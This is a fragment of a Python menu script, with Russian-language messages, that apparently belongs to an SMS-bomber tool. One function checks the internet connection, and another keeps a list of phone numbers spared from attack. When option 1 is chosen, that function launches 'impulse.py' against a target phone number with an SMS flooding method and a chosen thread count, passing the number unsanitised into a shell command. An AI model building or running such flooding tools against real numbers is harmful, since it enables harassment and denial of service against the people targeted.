...
def ICC():
    try:
        ...
        print(
            f"{Fore.RED}[!] {Fore.MAGENTA}Ваше устройство не подключено к интернету{Fore.RESET}"
        )
...
def Bomb():
	antispam = ["79502135308", "89502135308", "79503366421", "89503366421", "79615544631", "89615544631"]
	print("")
	...
	if bomber == "1":
		...
		print("")
		os.system("cd % && python impulse.py --target " + number + " --method SMS --threads " + threads)
	elif bomber == "2":
		print("")
